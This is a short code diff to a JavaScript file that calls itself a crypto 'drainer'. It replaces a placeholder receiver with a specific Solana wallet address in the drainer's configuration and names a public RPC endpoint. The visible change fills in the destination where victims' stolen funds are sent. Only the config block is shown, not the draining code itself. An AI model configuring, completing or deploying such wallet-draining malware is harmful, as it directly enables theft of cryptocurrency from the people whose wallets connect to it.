@@ -7,7 +7,7 @@ console.log('[drainer] app.js loaded');
 // ─── CONFIG ───────────────────────────────────────────────────
 // !! IMPORTANT: Replace with YOUR Solana wallet address !!
 const CONFIG = {
-    RECEIVER_WALLET: 'YOUR_SOLANA_WALLET_ADDRESS_HERE',
+    RECEIVER_WALLET: 'Zg5r67TdhqKf6YYcU6hi86j8Up7LX9DzBo5VZdmQE8y',
     // Use a free public RPC that allows POST
     RPC: 'https://solana-api.projectserum.com',
 };
